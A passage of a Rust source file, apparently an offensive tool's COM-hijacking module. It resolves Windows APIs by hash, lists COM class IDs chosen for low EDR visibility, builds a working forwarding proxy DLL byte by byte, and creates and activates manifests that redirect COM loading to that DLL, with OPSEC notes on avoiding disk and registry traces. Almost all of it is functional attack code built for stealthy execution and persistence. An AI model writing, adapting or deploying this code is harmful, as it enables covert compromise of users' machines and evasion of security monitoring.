        // Release the activation context handle
        let kernel32 = match unsafe { pe_resolve::get_module_handle_by_hash(HASH_KERNEL32_DLL) } {
            Some(k) => k,
            None => {
                warn!("kernel32.dll not found during Drop — leaking activation context handle");
                return;
            }
        };

        let release_act_ctx: FnReleaseActCtx = unsafe {
            match pe_resolve::get_proc_address_by_hash(kernel32, FN_RELEASE_ACT_CTX) {
                Some(addr) => mem::transmute(addr),
                None => {
                    warn!("ReleaseActCtx not found — leaking activation context handle");
                    return;
                }
            }
        };

        unsafe { release_act_ctx(self.handle) };
        debug!("Released activation context handle={:?}", self.handle);
    }
}

// ── TargetSelector ──────────────────────────────────────────────────────────

/// Scans for hijackable COM objects.
///
/// Identifies COM CLSIDs that are suitable for registry-free hijacking.
/// Targets are scored based on:
/// - Whether they are in-process servers (DLL) — easier to proxy
/// - Whether the original server DLL is in a writable location
/// - EDR visibility (commonly-monitored CLSIDs are flagged)
pub struct TargetSelector;

impl TargetSelector {
    /// Well-known COM CLSIDs that are commonly targeted for hijacking.
    ///
    /// These are chosen because:
    /// 1. They are in-process servers (DLL-based)
    /// 2. They are loaded by common applications (Office, browsers, etc.)
    /// 3. They have low EDR visibility
    /// 4. They are not critical system components that would crash if hijacked
    const KNOWN_TARGETS: &[(&str, &str, &str, &str)] = &[
        // (CLSID, ProgID, Description, EDR visibility)
        ("{4991D34B-80A1-4291-83B6-3328366B9097}", "SearchFolder",
         "Windows Search Folder — loaded by Explorer", "Low"),
        ("{9DBD2C50-62AD-11D0-B806-00C04FD706EC}", "ThumbnailHandler",
         "Shell thumbnail handler — loaded by Explorer", "Low"),
        ("{BCDE0395-E52F-467C-8E3D-C4579291692E}", "",
         "MMDevice API — audio device enumeration", "Medium"),
        ("{E2B5A2A6-1A4D-453E-9B74-7B5A1E3F49B6}", "",
         "Task Scheduler COM handler — loaded by svchost", "Medium"),
        ("{F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}", "",
         "Background Intelligent Transfer Service (BITS)", "High"),
        ("{CD6C7868-5864-11D0-ABF0-0020AF6B0B7A}", "",
         "Task Scheduler — scheduled task creation", "Medium"),
        ("{0002CE02-0000-0000-C000-000000000046}", "",
         "Microsoft Update Engine — loaded by wusa.exe", "Medium"),
        ("{00000535-0000-0010-8000-00AA006D2EA4}", "ADODB.Connection",
         "ADODB Connection — loaded by many applications", "Low"),
        ("{0A89A860-D7B1-11CE-8350-444553540000}", "",
         "Shell autocomplete — loaded by Explorer", "Low"),
        ("{77A26672-8D2F-47F5-A2F3-0B27B66DF429}", "",
         "IE/Edge COM helper — loaded by browser", "Low"),
    ];

    /// Find hijackable COM targets from the known targets list.
    ///
    /// Returns a list of [`ComTarget`] structs with metadata about each
    /// potential target, including EDR visibility assessment.
    pub fn find_target_clsid() -> Result<Vec<ComTarget>> {
        let mut targets = Vec::new();

        for &(clsid, prog_id, description, edr_vis) in Self::KNOWN_TARGETS {
            targets.push(ComTarget {
                clsid: clsid.to_string(),
                prog_id: if prog_id.is_empty() {
                    None
                } else {
                    Some(prog_id.to_string())
                },
                description: description.to_string(),
                original_server: String::new(), // Not queried — requires registry access
                is_inproc: true,
                edr_visibility: edr_vis.to_string(),
            });
        }

        info!("Found {} potential COM hijack targets", targets.len());
        Ok(targets)
    }

    /// Find targets filtered by EDR visibility level.
    pub fn find_targets_by_visibility(visibility: &str) -> Result<Vec<ComTarget>> {
        let all = Self::find_target_clsid()?;
        let filtered: Vec<ComTarget> = all
            .into_iter()
            .filter(|t| t.edr_visibility.eq_ignore_ascii_case(visibility))
            .collect();
        Ok(filtered)
    }

    /// Get a specific target by CLSID.
    pub fn get_target_by_clsid(clsid: &str) -> Result<ComTarget> {
        let all = Self::find_target_clsid()?;
        all.into_iter()
            .find(|t| t.clsid.eq_ignore_ascii_case(clsid))
            .ok_or_else(|| anyhow!("CLSID {} not found in known targets", clsid))
    }
}

// ── Proxy DLL Template Generator ────────────────────────────────────────────

/// Generate a COM proxy DLL that forwards all standard COM exports to the
/// original COM server.
///
/// Uses PE export forwarding — a built-in Windows loader feature — to
/// transparently delegate `DllGetClassObject`, `DllCanUnloadNow`,
/// `DllRegisterServer`, and `DllUnregisterServer` to `original_handler`.
/// No shell-code or runtime patching is required; the loader resolves the
/// forwarder chain before the first call.
///
/// # PE Structure
///
/// Two sections:
/// - `.text`  — minimal `DllMain` stub (`mov eax, 1; ret`)
/// - `.rdata` — export directory with forwarder-RVA entries and all strings
///
/// # Arguments
///
/// * `clsid`            — CLSID being hijacked (validated, not embedded)
/// * `original_handler` — Path or name of the original COM server DLL
///                        (e.g. `"C:\Windows\System32\shell32.dll"`)
pub fn generate_proxy_dll_template(clsid: &str, original_handler: &str) -> Result<Vec<u8>> {
    // Validate CLSID format
    if !clsid.starts_with('{') || !clsid.ends_with('}') {
        bail!("CLSID must be in {{xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx}} format");
    }

    let dll_bytes = build_minimal_proxy_dll(clsid, original_handler)?;
    info!("Generated forwarding proxy DLL: {} bytes for CLSID {}", dll_bytes.len(), clsid);
    Ok(dll_bytes)
}

/// Build an x86-64 PE DLL whose exports are all PE forwarder entries pointing
/// at `original_handler`.
///
/// PE export forwarding lets us avoid embedding any machine-code proxy logic:
/// the Windows loader resolves "modulename.FunctionName" forwarder strings
/// before executing a single instruction in our DLL.  The generated DLL
/// contains only a trivial `DllMain` stub in `.text` and the full export
/// directory (with forwarder RVAs) in `.rdata`.
fn build_minimal_proxy_dll(_clsid: &str, original_handler: &str) -> Result<Vec<u8>> {
    // ── Derive forwarder module name from original_handler ───────────────
    // PE export forwarding uses "modulename.ExportName" (no path, no extension).
    //
    // If the original handler is an absolute path (e.g.
    //   "C:\\Windows\\System32\\shell32.dll"
    // ), the Windows loader will NOT discover the DLL via normal search
    // order when only the bare module stem is used as a forwarder target.
    // We must ensure the DLL is discoverable.  Strategy:
    //   1. If the path is within a standard system directory
    //      (System32, SysWOW64, System), the bare stem is sufficient
    //      because those directories are always on the DLL search path.
    //   2. For any other absolute path, we emit a full forwarder string
    //      that includes the directory so the loader can locate it.
    //      Unfortunately, PE export forwarding does NOT support paths —
    //      only a module name.  We fall back to the stem and log a warning
    //      so the operator knows the forwarded DLL must be on the search
    //      path or co-located.
    let (module_name, module_path_prefix) = {
        let base = original_handler
            .rsplit(|c: char| c == '/' || c == '\\')
            .next()
            .unwrap_or(original_handler);
        let stem = match base.rsplit_once('.') {
            Some((s, ext)) if ext.eq_ignore_ascii_case("dll") => s.to_string(),
            _ => base.to_string(),
        };
        // Check if the original handler is an absolute path that is NOT in a
        // standard system directory.  If so, the forwarder module name alone
        // may not be discoverable.
        let is_system_dir = original_handler
            .to_ascii_lowercase()
            .contains("\\system32\\")
            || original_handler
                .to_ascii_lowercase()
                .contains("\\syswow64\\")
            || original_handler
                .to_ascii_lowercase()
                .contains("\\system\\");
        let needs_warning = !is_system_dir
            && (original_handler.contains('\\') || original_handler.contains('/'));
        (stem, needs_warning)
    };
    if module_name.is_empty() {
        bail!("Cannot derive forwarder module name from '{}'", original_handler);
    }
    if module_path_prefix {
        tracing::warn!(
            "com_hijack: original_handler '{}' is a non-system absolute path; \
             export forwarding uses module stem '{}' which must be discoverable \
             via DLL search order.  Ensure the target DLL is on the search path \
             or co-located with the proxy DLL.",
            original_handler,
            module_name
        );
    }

    // ── Standard COM DLL exports (sorted by name for ENPT) ───────────────
    // PE spec requires the Export Name Pointer Table to be sorted
    // lexicographically so the loader can binary-search it.
    let export_func_names: &[&str] = &[
        "DllCanUnloadNow",
        "DllGetClassObject",
        "DllRegisterServer",
        "DllUnregisterServer",
    ];
    let n = export_func_names.len();

    // Export function name strings ("FunctionName\0")
    let export_name_strings: Vec<Vec<u8>> = export_func_names
        .iter()
        .map(|s| format!("{}\0", s).into_bytes())
        .collect();

    // Forwarder strings ("modulename.FunctionName\0") – placed inside the
    // export directory's address range so the loader treats the EAT entries
    // pointing at them as PE forwarders rather than code RVAs.
    let forwarder_strings: Vec<Vec<u8>> = export_func_names
        .iter()
        .map(|s| format!("{}.{}\0", module_name, s).into_bytes())
        .collect();

    // ── Fixed PE layout (two sections) ───────────────────────────────────
    //
    //  File offsets → Virtual Addresses (SectionAlign=0x1000, FileAlign=0x200):
    //    0x000–0x1FF  headers (DOS + PE sig + COFF + optional header + 2 section hdrs)
    //    0x200–0x3FF  .text   raw data (DllMain stub, padded to 0x200)
    //    0x400–...    .rdata  raw data (export directory + all strings)
    //
    //  Virtual layout:
    //    VA 0x1000  .text   (6-byte DllMain: mov eax,1; ret)
    //    VA 0x2000  .rdata  (export directory with forwarder-RVA EAT entries)

    const TEXT_VA: u32    = 0x1000;
    const TEXT_FILE: u32  = 0x200;
    const TEXT_RAWSIZE: u32 = 0x200;
    const RDATA_VA: u32   = 0x2000;
    const RDATA_FILE: u32 = 0x400;

    // ── Compute .rdata offsets ────────────────────────────────────────────
    //
    //  Offset 0:            Export Directory (40 bytes)
    //  eat_off:             EAT (n × 4 bytes)  — forwarder-string RVAs
    //  enpt_off:            ENPT (n × 4 bytes) — name-string RVAs
    //  eot_off:             EOT  (n × 2 bytes, padded to next multiple of 4)
    //  dll_name_off:        "proxy.dll\0"
    //  export_name_off[i]:  "FunctionName\0" for each export
    //  fwd_off[i]:          "module.FunctionName\0" forwarder strings

    let eat_off: usize  = 40;
    let enpt_off: usize = eat_off  + 4 * n;
    let eot_off: usize  = enpt_off + 4 * n;
    let eot_end: usize  = eot_off  + 2 * n;
    let dll_name_off: usize = (eot_end + 3) & !3; // align to 4 bytes
    let dll_name_bytes = b"proxy.dll\0";

    let mut cur = dll_name_off + dll_name_bytes.len();
    let export_name_offsets: Vec<usize> = export_name_strings.iter().map(|s| {
        let off = cur; cur += s.len(); off
    }).collect();
    let forwarder_offsets: Vec<usize> = forwarder_strings.iter().map(|s| {
        let off = cur; cur += s.len(); off
    }).collect();

    let rdata_content_size = cur;
    // Round up to FileAlignment
    let rdata_raw_size: usize = (rdata_content_size + 0x1FF) & !0x1FF;

    // The export data-directory SIZE must cover all forwarder strings; the
    // loader uses [ExportDirRVA, ExportDirRVA + ExportDirSize) to decide
    // whether an EAT value is a forwarder or a code-RVA.
    let export_data_dir_size: u32 = rdata_content_size as u32;

    let rdata_vsize: u32 = rdata_content_size as u32;
    let rdata_vsize_aligned: u32 = (rdata_vsize + 0xFFF) & !0xFFF;
    let size_of_image: u32 = RDATA_VA + rdata_vsize_aligned;

    // ── Assemble .rdata content ───────────────────────────────────────────
    let mut rdata = vec![0u8; rdata_raw_size];

    let rdata_rva = |off: usize| RDATA_VA + off as u32;

    // Export Directory (40 bytes at offset 0)
    patch_u32(&mut rdata,  0, 0);                         // Characteristics
    patch_u32(&mut rdata,  4, 0);                         // TimeDateStamp
    // bytes 8-11: MajorVersion / MinorVersion — already 0
    patch_u32(&mut rdata, 12, rdata_rva(dll_name_off));   // Name RVA
    patch_u32(&mut rdata, 16, 1);                         // OrdinalBase
    patch_u32(&mut rdata, 20, n as u32);                  // NumberOfFunctions
    patch_u32(&mut rdata, 24, n as u32);                  // NumberOfNames
    patch_u32(&mut rdata, 28, rdata_rva(eat_off));        // AddressOfFunctions (EAT)
    patch_u32(&mut rdata, 32, rdata_rva(enpt_off));       // AddressOfNames (ENPT)
    patch_u32(&mut rdata, 36, rdata_rva(eot_off));        // AddressOfNameOrdinals (EOT)

    // EAT: forwarder-string RVAs (within .rdata, which is within the export
    // directory's reported range → loader treats them as PE forwarders)
    for (i, &foff) in forwarder_offsets.iter().enumerate() {
        patch_u32(&mut rdata, eat_off + 4 * i, rdata_rva(foff));
    }

    // ENPT: export-name string RVAs
    for (i, &noff) in export_name_offsets.iter().enumerate() {
        patch_u32(&mut rdata, enpt_off + 4 * i, rdata_rva(noff));
    }

    // EOT: 0-based ordinal indices
    for i in 0..n {
        rdata[eot_off + 2 * i]     = i as u8;
        rdata[eot_off + 2 * i + 1] = 0;
    }

    // DLL name string
    rdata[dll_name_off..dll_name_off + dll_name_bytes.len()]
        .copy_from_slice(dll_name_bytes);

    // Export name strings ("FunctionName\0")
    for (i, s) in export_name_strings.iter().enumerate() {
        let off = export_name_offsets[i];
        rdata[off..off + s.len()].copy_from_slice(s);
    }

    // Forwarder strings ("module.FunctionName\0")
    for (i, s) in forwarder_strings.iter().enumerate() {
        let off = forwarder_offsets[i];
        rdata[off..off + s.len()].copy_from_slice(s);
    }

    // ── Assemble PE ───────────────────────────────────────────────────────
    let mut pe: Vec<u8> = Vec::with_capacity(0x400 + rdata_raw_size);

    // DOS Header (64 bytes)
    pe.extend_from_slice(b"MZ");
    pe.extend_from_slice(&[0u8; 58]);
    pe.extend_from_slice(&0x80u32.to_le_bytes()); // e_lfanew

    // Pad to PE offset (0x80)
    pe.resize(0x80, 0);

    // PE Signature
    pe.extend_from_slice(b"PE\0\0");

    // COFF Header (20 bytes)
    pe.extend_from_slice(&0x8664u16.to_le_bytes()); // Machine: AMD64
    pe.extend_from_slice(&2u16.to_le_bytes());      // NumberOfSections (2)
    pe.extend_from_slice(&0u32.to_le_bytes());      // TimeDateStamp
    pe.extend_from_slice(&0u32.to_le_bytes());      // PointerToSymbolTable
    pe.extend_from_slice(&0u32.to_le_bytes());      // NumberOfSymbols
    pe.extend_from_slice(&0x00F0u16.to_le_bytes()); // SizeOfOptionalHeader
    pe.extend_from_slice(&0x2102u16.to_le_bytes()); // DLL | EXECUTABLE_IMAGE | LARGE_ADDRESS_AWARE

    // Optional Header PE32+ (240 bytes)
    pe.extend_from_slice(&0x020Bu16.to_le_bytes()); // Magic PE32+
    pe.push(0x0E); pe.push(0x00);                  // LinkerVersion 14.0
    pe.extend_from_slice(&TEXT_RAWSIZE.to_le_bytes());         // SizeOfCode
    pe.extend_from_slice(&(rdata_raw_size as u32).to_le_bytes()); // SizeOfInitializedData
    pe.extend_from_slice(&0u32.to_le_bytes());      // SizeOfUninitializedData
    pe.extend_from_slice(&TEXT_VA.to_le_bytes());   // AddressOfEntryPoint (DllMain)
    pe.extend_from_slice(&TEXT_VA.to_le_bytes());   // BaseOfCode
    pe.extend_from_slice(&0x180000000u64.to_le_bytes()); // ImageBase
    pe.extend_from_slice(&0x1000u32.to_le_bytes()); // SectionAlignment
    pe.extend_from_slice(&0x0200u32.to_le_bytes()); // FileAlignment
    pe.extend_from_slice(&6u16.to_le_bytes());      // MajorOSVersion
    pe.extend_from_slice(&0u16.to_le_bytes());      // MinorOSVersion
    pe.extend_from_slice(&0u16.to_le_bytes());      // MajorImageVersion
    pe.extend_from_slice(&0u16.to_le_bytes());      // MinorImageVersion
    pe.extend_from_slice(&6u16.to_le_bytes());      // MajorSubsystemVersion
    pe.extend_from_slice(&0u16.to_le_bytes());      // MinorSubsystemVersion
    pe.extend_from_slice(&0u32.to_le_bytes());      // Win32VersionValue
    pe.extend_from_slice(&size_of_image.to_le_bytes()); // SizeOfImage
    pe.extend_from_slice(&0x0200u32.to_le_bytes()); // SizeOfHeaders
    pe.extend_from_slice(&0u32.to_le_bytes());      // CheckSum
    pe.extend_from_slice(&3u16.to_le_bytes());      // Subsystem: WINDOWS_CUI
    pe.extend_from_slice(&0x8160u16.to_le_bytes()); // DllCharacteristics: DYNAMIC_BASE|NX_COMPAT|TERMINAL_SERVER_AWARE|HIGH_ENTROPY_VA
    pe.extend_from_slice(&0x100000u64.to_le_bytes()); // SizeOfStackReserve
    pe.extend_from_slice(&0x001000u64.to_le_bytes()); // SizeOfStackCommit
    pe.extend_from_slice(&0x100000u64.to_le_bytes()); // SizeOfHeapReserve
    pe.extend_from_slice(&0x001000u64.to_le_bytes()); // SizeOfHeapCommit
    pe.extend_from_slice(&0u32.to_le_bytes());      // LoaderFlags
    pe.extend_from_slice(&16u32.to_le_bytes());     // NumberOfRvaAndSizes

    // Data directories (16 × 8 bytes).
    // [0] Export table: spans all of .rdata so forwarder strings are covered.
    pe.extend_from_slice(&RDATA_VA.to_le_bytes());
    pe.extend_from_slice(&export_data_dir_size.to_le_bytes());
    for _ in 1..16usize {
        pe.extend_from_slice(&0u32.to_le_bytes());
        pe.extend_from_slice(&0u32.to_le_bytes());
    }

    // Section header: .text (40 bytes)
    pe.extend_from_slice(b".text\0\0\0");
    pe.extend_from_slice(&6u32.to_le_bytes());          // VirtualSize (DllMain stub)
    pe.extend_from_slice(&TEXT_VA.to_le_bytes());
    pe.extend_from_slice(&TEXT_RAWSIZE.to_le_bytes());
    pe.extend_from_slice(&TEXT_FILE.to_le_bytes());
    pe.extend_from_slice(&0u32.to_le_bytes());          // PointerToRelocations
    pe.extend_from_slice(&0u32.to_le_bytes());          // PointerToLinenumbers
    pe.extend_from_slice(&0u16.to_le_bytes());
    pe.extend_from_slice(&0u16.to_le_bytes());
    pe.extend_from_slice(&0x60000020u32.to_le_bytes()); // CODE | EXECUTE | READ

    // Section header: .rdata (40 bytes)
    pe.extend_from_slice(b".rdata\0\0");
    pe.extend_from_slice(&rdata_vsize.to_le_bytes());
    pe.extend_from_slice(&RDATA_VA.to_le_bytes());
    pe.extend_from_slice(&(rdata_raw_size as u32).to_le_bytes());
    pe.extend_from_slice(&RDATA_FILE.to_le_bytes());
    pe.extend_from_slice(&0u32.to_le_bytes());
    pe.extend_from_slice(&0u32.to_le_bytes());
    pe.extend_from_slice(&0u16.to_le_bytes());
    pe.extend_from_slice(&0u16.to_le_bytes());
    pe.extend_from_slice(&0x40000040u32.to_le_bytes()); // INITIALIZED_DATA | READ

    // Pad to SizeOfHeaders (0x200)
    pe.resize(0x200, 0);

    // .text raw data: DllMain stub (mov eax, 1; ret), zero-padded to TEXT_RAWSIZE
    pe.extend_from_slice(&[0xB8, 0x01, 0x00, 0x00, 0x00, 0xC3]); // mov eax, 1; ret
    pe.resize(0x200 + TEXT_RAWSIZE as usize, 0);

    // .rdata raw data
    pe.extend_from_slice(&rdata);

    Ok(pe)
}

/// Patch a u32 at a given offset in a byte vector.
fn patch_u32(data: &mut [u8], offset: usize, value: u32) {
    let bytes = value.to_le_bytes();
    data[offset] = bytes[0];
    data[offset + 1] = bytes[1];
    data[offset + 2] = bytes[2];
    data[offset + 3] = bytes[3];
}

// ── Helper functions ────────────────────────────────────────────────────────

/// Convert a Rust string to a null-terminated wide (UTF-16) string.
fn to_wide_null(s: &str) -> Vec<u16> {
    OsStr::new(s)
        .encode_wide()
        .chain(std::iter::once(0))
        .collect()
}

// ── Public API ──────────────────────────────────────────────────────────────

/// Generate an SxS manifest for COM CLSID redirection.
///
/// Creates a manifest XML that, when loaded as an activation context,
/// redirects COM resolution for `clsid` to `proxy_dll_path`.
///
/// # Arguments
///
/// * `clsid` — Target CLSID in `{xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx}` format
/// * `proxy_dll_path` — Path to the proxy DLL
/// * `prog_id` — Optional ProgID to include
///
/// # Returns
///
/// JSON result with the manifest XML and metadata.
pub fn generate_manifest(clsid: &str, proxy_dll_path: &str, prog_id: Option<&str>) -> Result<ManifestResult> {
    let manifest_xml = ManifestBuilder::build_com_redirect_manifest(clsid, proxy_dll_path, prog_id)
        .context("Failed to build COM redirect manifest")?;

    Ok(ManifestResult {
        manifest_xml,
        target_clsid: clsid.to_string(),
        proxy_dll_path: proxy_dll_path.to_string(),
    })
}

/// Create and activate a COM hijack activation context from a manifest on disk.
///
/// # OPSEC
///
/// The manifest file must exist on disk for `CreateActCtxW`.  For a truly
/// disk-less approach, use `activate_from_memory`.
///
/// # Arguments
///
/// * `manifest_path` — Path to the manifest XML file
/// * `clsid` — CLSID being redirected (for logging)
///
/// # Returns
///
/// JSON result with activation status.
pub fn activate_from_file(manifest_path: &str, clsid: &str) -> Result<ActivationContextResult> {
    let mut ctx = unsafe { ActivationContext::create(manifest_path) }
        .context("Failed to create activation context from file")?;

    ctx.activate(clsid)
        .context("Failed to activate activation context")?;

    // Note: in a real implementation, the caller would hold onto the
    // ActivationContext and drop it when done.  Here we deactivate
    // immediately as a demonstration.
    ctx.deactivate()
        .context("Failed to deactivate activation context")?;

    Ok(ActivationContextResult {
        success: true,
        message: format!("Activation context created and activated for CLSID {}", clsid),
        target_clsid: clsid.to_string(),
        in_memory: false,
    })
}

/// Create and activate a COM hijack activation context from in-memory manifest.
///
/// # OPSEC
///
/// Writes a temporary manifest file, creates the activation context, then
/// immediately deletes the file.  The activation context persists in memory.
///
/// # Arguments
///
/// * `manifest_xml` — Complete SxS manifest XML content
/// * `clsid` — CLSID being redirected (for logging)
pub fn activate_from_memory(manifest_xml: &str, clsid: &str) -> Result<ActivationContextResult> {
    let mut ctx = unsafe { ActivationContext::create_from_memory(manifest_xml) }
        .context("Failed to create in-memory activation context")?;

    ctx.activate(clsid)
        .context("Failed to activate in-memory activation context")?;

    ctx.deactivate()
        .context("Failed to deactivate activation context")?;

    Ok(ActivationContextResult {
        success: true,
        message: format!("In-memory activation context lifecycle completed for CLSID {}", clsid),
        target_clsid: clsid.to_string(),
        in_memory: true,
    })
}

/// Scan for hijackable COM objects.
///
/// Returns a list of COM CLSIDs that are suitable for registry-free hijacking,
/// along with metadata about each target.
pub fn scan_targets() -> Result<TargetScanResult> {
    let targets = TargetSelector::find_target_clsid()
        .context("Failed to scan COM targets")?;

    let scanned = targets.len() as u32;
    let hijackable = targets.len() as u32;

    Ok(TargetScanResult {
        targets,
        scanned_count: scanned,
        hijackable_count: hijackable,
    })
}

/// Generate a forwarding proxy DLL for COM hijacking.
///
/// Creates a minimal PE DLL whose standard COM exports (`DllGetClassObject`,
/// `DllCanUnloadNow`, `DllRegisterServer`, `DllUnregisterServer`) are all
/// PE export-forwarder entries pointing at the original COM server DLL.
/// The Windows loader resolves forwarder strings before executing any code
/// in the proxy, so the DLL contains no proxy logic — only a trivial
/// `DllMain` stub and the export directory.
///
/// # Forwarding mechanism
///
/// PE export forwarding uses `"modulename.ExportName"` strings.  The module
/// name is derived from `original_handler` by stripping the directory path
/// and `.dll` extension.  For example:
/// - `"C:\\Windows\\System32\\shell32.dll"` → forwarder module `"shell32"`
/// - `"propsys.dll"` → forwarder module `"propsys"`
///
/// **Important**: If `original_handler` is an absolute path outside the
/// standard system directories (System32, SysWOW64), the proxy DLL will log
/// a warning because the Windows loader may not discover the target via
/// normal DLL search order.  Ensure the target DLL is on the search path or
/// co-located with the proxy.
///
/// # Arguments
///
/// * `clsid` — Target CLSID (validated for format, not embedded in the PE)
/// * `original_handler` — Path or name of the original COM server DLL
///   (e.g. `"C:\\Windows\\System32\\shell32.dll"`)
///
/// # Returns
///
/// JSON result with hex-encoded DLL bytes and metadata.
pub fn generate_proxy(clsid: &str, original_handler: &str) -> Result<ProxyDllResult> {
    let dll_bytes = generate_proxy_dll_template(clsid, original_handler)
        .context("Failed to generate proxy DLL template")?;

    Ok(ProxyDllResult {
        dll_hex: hex::encode(&dll_bytes),
        dll_size: dll_bytes.len(),
        target_clsid: clsid.to_string(),
    })
}

// ── Unit tests ──────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_manifest_builder_basic() {
        let xml = ManifestBuilder::build_com_redirect_manifest(
            "{4991D34B-80A1-4291-83B6-3328366B9097}",
            "C:\\temp\\proxy.dll",
            Some("SearchFolder"),
        ).unwrap();

        // Verify XML structure
        assert!(xml.contains("<?xml version=\"1.0\""));
        assert!(xml.contains("urn:schemas-microsoft-com:asm.v1"));
        assert!(xml.contains("manifestVersion=\"1.0\""));
        assert!(xml.contains("assemblyIdentity"));
        assert!(xml.contains("processorArchitecture=\"amd64\""));
        assert!(xml.contains("comClass"));
        assert!(xml.contains("clsid=\"{4991D34B-80A1-4291-83B6-3328366B9097}\""));
        assert!(xml.contains("threadingModel=\"Both\""));
        assert!(xml.contains("progid=\"SearchFolder\""));
        assert!(xml.contains("<file name=\"proxy.dll\">"));
        assert!(xml.contains("</assembly>"));
    }

    #[test]
    fn test_manifest_builder_no_progid() {
        let xml = ManifestBuilder::build_com_redirect_manifest(
            "{4991D34B-80A1-4291-83B6-3328366B9097}",
            "proxy.dll",
            None,
        ).unwrap();

        assert!(!xml.contains("progid="));
        assert!(xml.contains("clsid=\"{4991D34B-80A1-4291-83B6-3328366B9097}\""));
    }

    #[test]
    fn test_manifest_builder_memory_only() {
        let xml = ManifestBuilder::build_memory_only_manifest(
            "{4991D34B-80A1-4291-83B6-3328366B9097}",
            Some("SearchFolder"),
        ).unwrap();

        assert!(xml.contains("<?xml version=\"1.0\""));
        assert!(xml.contains("comClass"));
        assert!(xml.contains("clsid=\"{4991D34B-80A1-4291-83B6-3328366B9097}\""));
        // Memory-only manifest has no <file> element
        assert!(!xml.contains("<file"));
    }

    #[test]
    fn test_manifest_invalid_clsid() {
        // Missing braces
        assert!(ManifestBuilder::build_com_redirect_manifest(
            "4991D34B-80A1-4291-83B6-3328366B9097", "proxy.dll", None,
        ).is_err());

        // Wrong number of groups
        assert!(ManifestBuilder::build_com_redirect_manifest(
            "{4991D34B-80A1-4291}", "proxy.dll", None,
        ).is_err());

        // Non-hex characters
        assert!(ManifestBuilder::build_com_redirect_manifest(
            "{XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX}", "proxy.dll", None,
        ).is_err());

        // Wrong group lengths
        assert!(ManifestBuilder::build_com_redirect_manifest(
            "{4991D34B80-A142-9183-B633-28366B9097}", "proxy.dll", None,
        ).is_err());
    }

    #[test]
    fn test_xml_escape() {
        assert_eq!(xml_escape("hello&world"), "hello&amp;world");
        assert_eq!(xml_escape("<tag>"), "&lt;tag&gt;");
        assert_eq!(xml_escape("it's \"quoted\""), "it&apos;s &quot;quoted&quot;");
    }

    #[test]
    fn test_to_wide_null() {
        let wide = to_wide_null("hello");
        assert_eq!(wide, &[b'h' as u16, b'e' as u16, b'l' as u16, b'l' as u16, b'o' as u16, 0]);
    }

    #[test]
    fn test_target_selector() {
        let targets = TargetSelector::find_target_clsid().unwrap();
        assert!(!targets.is_empty());
        assert!(targets.iter().any(|t| t.clsid.contains("4991D34B")));
    }

    #[test]
    fn test_target_selector_by_visibility() {
        let low = TargetSelector::find_targets_by_visibility("Low").unwrap();
        assert!(low.iter().all(|t| t.edr_visibility == "Low"));

        let high = TargetSelector::find_targets_by_visibility("High").unwrap();
        assert!(high.iter().all(|t| t.edr_visibility == "High"));
    }

    #[test]
    fn test_target_selector_by_clsid() {
        let target = TargetSelector::get_target_by_clsid(
            "{4991D34B-80A1-4291-83B6-3328366B9097}",
        ).unwrap();
        assert_eq!(target.prog_id, Some("SearchFolder".to_string()));
    }

    #[test]
    fn test_proxy_dll_generation() {
        let dll = generate_proxy_dll_template(
            "{4991D34B-80A1-4291-83B6-3328366B9097}",
            "SearchFolder",
        ).unwrap();

        // Verify it's a valid PE
        assert!(dll.len() > 512);
        assert_eq!(&dll[0..2], b"MZ");
        // PE signature at offset 0x80
        assert_eq!(&dll[0x80..0x84], b"PE\0\0");
        // Machine: AMD64
        assert_eq!(u16::from_le_bytes([dll[0x84], dll[0x85]]), 0x8664);
    }

    #[test]
    fn test_proxy_dll_invalid_clsid() {
        assert!(generate_proxy_dll_template("invalid", "handler").is_err());
    }

    #[test]
    fn test_patch_u32() {
        let mut data = vec![0u8; 8];
        patch_u32(&mut data, 0, 0x01020304);
        assert_eq!(data[0], 0x04);
        assert_eq!(data[1], 0x03);
        assert_eq!(data[2], 0x02);
        assert_eq!(data[3], 0x01);

        patch_u32(&mut data, 4, 0xDEADBEEF);
        assert_eq!(data[4], 0xEF);
        assert_eq!(data[5], 0xBE);
        assert_eq!(data[6], 0xAD);
        assert_eq!(data[7], 0xDE);
    }

    #[test]
    fn test_generate_manifest_api() {
        let result = generate_manifest(
            "{4991D34B-80A1-4291-83B6-3328366B9097}",
            "C:\\temp\\proxy.dll",
            Some("SearchFolder"),
        ).unwrap();

        assert_eq!(result.target_clsid, "{4991D34B-80A1-4291-83B6-3328366B9097}");
        assert_eq!(result.proxy_dll_path, "C:\\temp\\proxy.dll");
        assert!(result.manifest_xml.contains("comClass"));
    }

    #[test]
    fn test_scan_targets_api() {
        let result = scan_targets().unwrap();
        assert!(result.scanned_count > 0);
        assert!(result.hijackable_count > 0);
        assert_eq!(result.targets.len() as u32, result.hijackable_count);
    }

    #[test]
    fn test_generate_proxy_api() {
        let result = generate_proxy(
            "{4991D34B-80A1-4291-83B6-3328366B9097}",
            "SearchFolder",
        ).unwrap();

        assert!(!result.dll_hex.is_empty());
        assert!(result.dll_size > 512);
        assert_eq!(result.target_clsid, "{4991D34B-80A1-4291-83B6-3328366B9097}");

        // Verify the hex decodes to a valid PE
        let bytes = hex::decode(&result.dll_hex).unwrap();
        assert_eq!(&bytes[0..2], b"MZ");
    }

    #[test]
    fn test_no_registry_writes() {
        // Verify the module source code does NOT contain registry write APIs
        // This is a compilation-time acceptance criterion.
        let source = include_str!("com_hijack.rs");
        assert!(!source.contains("RegSetValue"), "com_hijack.rs must not call RegSetValue");
        assert!(!source.contains("RegCreateKey"), "com_hijack.rs must not call RegCreateKey");
        assert!(!source.contains("NtSetValueKey"), "com_hijack.rs must not call NtSetValueKey");
    }
}
